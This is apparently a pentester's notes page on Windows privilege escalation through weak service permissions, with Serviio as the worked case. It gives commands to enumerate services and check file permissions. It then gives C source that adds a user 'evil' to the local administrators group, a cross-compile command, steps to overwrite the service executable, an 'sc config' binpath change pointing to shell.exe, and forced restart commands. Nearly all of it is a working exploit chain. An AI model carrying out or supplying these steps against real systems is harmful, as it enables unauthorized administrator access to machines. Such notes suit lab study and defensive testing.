---
title: weak services
category: win privesc
order: 1
---


[WPE-04 - Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/)

# serviio case  
## | check services
```
tasklist /V
```
or
```
wmic process get ProcessID,ExecutablePath
```
or:
```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```
serviio looks installed in program files .
this means the service is user-installed and the software developer is in charge of the directory
structure as well as permissions of the software.
## | check permissions
```
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)
```
it appears that any user (BUILTIN\Users) on the system has full read and
write access to it.
## | masks permissions
* F Full access
* M Modify access
* RX Read and execute access
* R Read-only access
* W Write-only access

## | compile binary to replace serviio  
```
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
return 0;
}
```

```
kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

## | replace the binary
```
move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
```

## | option 2 chane registry
```
sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"
```
## | restart service
```
net stop Serviio
```
if we dont have access to restart a service we can reboot maybe?

```
shutdown /r /t 0
```
